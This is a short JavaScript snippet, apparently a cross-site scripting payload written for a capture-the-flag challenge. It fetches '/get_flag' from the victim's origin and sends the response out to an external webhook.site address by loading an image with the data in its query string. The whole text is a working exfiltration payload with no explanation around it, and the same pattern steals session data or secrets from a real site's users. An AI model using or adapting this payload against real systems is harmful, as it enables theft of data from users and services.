fetch('/get_flag')
       .then(response => response.text())
       .then(flag => {
         new Image().src = 'https://webhook.site/cb15343c-3eab-44e7-9197-4b932bed14e6?flag=' + encodeURIComponent(flag);
       })
       .catch(error => console.error('Failed to fetch flag:', error));
